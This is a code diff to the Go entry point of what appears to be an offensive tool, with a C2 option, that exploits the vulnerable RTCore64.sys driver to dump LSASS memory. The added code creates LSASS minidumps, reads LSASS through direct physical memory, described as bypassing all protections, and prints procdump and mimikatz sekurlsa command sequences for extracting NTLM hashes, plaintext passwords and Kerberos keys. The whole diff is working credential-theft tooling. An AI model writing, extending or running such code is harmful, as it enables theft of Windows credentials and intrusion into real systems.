@@ -503,6 +503,8 @@ func main() {
 	testMode := flag.Bool("test", false, "Run in test mode (RTCore64 exploit test only)")
 	noC2 := flag.Bool("no-c2", false, "Run without C2 communication (standalone mode)")
 	version := flag.Bool("version", false, "Show version information")
+	mimikatzMode := flag.Bool("mimikatz", false, "Create LSASS minidump (mimikatz-style)")
+	dumpPath := flag.String("dump", "./lsass.dmp", "Path for LSASS minidump output")
 
 	flag.Parse()
 
@@ -570,6 +572,8 @@ func main() {
 	if *testMode {
 		log.Info("Running in test mode...")
 		runTestMode(rtExploit, log)
+	} else if *mimikatzMode {
+		runMimikatzMode(rtExploit, *dumpPath, log)
 	} else if *noC2 {
 		runStandaloneMode(dumper, log)
 	} else {
@@ -593,22 +597,85 @@ func runTestMode(exploit *byovd.RTCoreExploit, log *logger.Logger) {
 	log.Info("RTCore64.sys is operational and ready for credential extraction.")
 }
 
-// runStandaloneMode executes the credential extraction without C2 communication.
-func runStandaloneMode(dumper *lsass.KernelLsassDumper, log *logger.Logger) {
-	log.Info("=== STANDALONE MODE: COMPREHENSIVE ATTACK CHAIN ===")
+// runMimikatzMode creates a LSASS minidump using mimikatz-style approach
+func runMimikatzMode(rtExploit *byovd.RTCoreExploit, dumpPath string, log *logger.Logger) {
+	log.Info("=== MIMIKATZ MODE: LSASS MINIDUMP CREATION ===")
+	log.Info("This mimics mimikatz's 'sekurlsa::minidump' functionality")
 
-	// PHASE 2: LSASS CREDENTIAL EXTRACTION (Token stealing already done in main)
-	log.Info("Phase 2: Executing comprehensive LSASS credential extraction...")
-	if dumper == nil {
-		log.Error("KernelLsassDumper not available.")
+	// Create the mimikatz-style minidump extractor
+	minidumpExtractor := lsass.NewMimikatzMinidumpExtractor(rtExploit, log)
+
+	// Create the LSASS minidump
+	err := minidumpExtractor.CreateLsassMinidump(dumpPath)
+	if err != nil {
+		log.Errorf("Failed to create LSASS minidump: %v", err)
+		log.Info("")
+		log.Info("=== ALTERNATIVE APPROACHES ===")
+		log.Info("1. Download ProcDump from Sysinternals:")
+		log.Info("   https://docs.microsoft.com/en-us/sysinternals/downloads/procdump")
+		log.Info("")
+		log.Info("2. Create LSASS dump with ProcDump:")
+		log.Info("   procdump64.exe -accepteula -ma lsass.exe lsass.dmp")
+		log.Info("")
+		log.Info("3. Analyze with mimikatz:")
+		log.Info("   mimikatz.exe")
+		log.Info("   mimikatz # sekurlsa::minidump lsass.dmp")
+		log.Info("   mimikatz # sekurlsa::logonPasswords full")
+		log.Info("")
+		log.Info("4. Or use Task Manager (requires Admin):")
+		log.Info("   - Open Task Manager (Ctrl+Shift+Esc)")
+		log.Info("   - Details tab → Right-click lsass.exe → Create dump file")
 		os.Exit(1)
 	}
 
-	credentials, err := dumper.DumpCredentials()
-	if err != nil {
-		log.Errorf("Kernel LSASS dumper failed: %v", err)
-		log.Error("Check RTCore driver access and LSASS process availability.")
+	log.Info("")
+	log.Info("=== MINIDUMP CREATED SUCCESSFULLY ===")
+	log.Infof("Dump file: %s", dumpPath)
+	log.Info("")
+	log.Info("To extract credentials using mimikatz:")
+	log.Info("  mimikatz.exe")
+	log.Infof("  mimikatz # sekurlsa::minidump %s", dumpPath)
+	log.Info("  mimikatz # sekurlsa::logonPasswords full")
+	log.Info("  mimikatz # sekurlsa::ekeys")
+	log.Info("  mimikatz # sekurlsa::kerberos")
+	log.Info("")
+	log.Info("Supported credential extraction commands:")
+	log.Info("  - sekurlsa::logonPasswords    (NTLM, LM, SHA1, plaintext)")
+	log.Info("  - sekurlsa::ekeys             (Kerberos encryption keys)")
+	log.Info("  - sekurlsa::tickets           (Kerberos tickets)")
+	log.Info("  - sekurlsa::wdigest           (WDigest credentials)")
+	log.Info("  - sekurlsa::msv               (MSV1_0 credentials)")
+	log.Info("  - sekurlsa::tspkg             (TsPkg credentials)")
+	log.Info("  - sekurlsa::ssp               (SSP credentials)")
+}
+
+// runStandaloneMode executes the credential extraction without C2 communication.
+func runStandaloneMode(dumper *lsass.KernelLsassDumper, log *logger.Logger) {
+	log.Info("=== STANDALONE MODE: DIRECT PHYSICAL MEMORY DUMP ===")
+
+	// PHASE 2: LSASS CREDENTIAL EXTRACTION via DIRECT PHYSICAL MEMORY
+	log.Info("Phase 2: Reading LSASS memory via DIRECT physical RAM access...")
+	if dumper == nil {
+		log.Error("Dumper not available.")
 		os.Exit(1)
+	}
+
+	// Try the direct physical memory approach first
+	log.Info("Attempting DIRECT physical memory read (bypasses ALL protections)...")
+	directDumper := lsass.NewDirectMemoryDumper(dumper.GetRTCore(), log)
+	credentials, err := directDumper.DumpLsassMemoryDirect()
+
+	if err != nil {
+		log.Warnf("Direct memory dump failed: %v", err)
+		log.Info("Falling back to kernel mode dumper...")
+
+		// Fallback to original method
+		credentials, err = dumper.DumpCredentials()
+		if err != nil {
+			log.Errorf("All methods failed: %v", err)
+			log.Error("Check RTCore driver access and LSASS process availability.")
+			os.Exit(1)
+		}
 	}
 
 	log.Infof("Successfully extracted %d credential sets:", len(credentials))
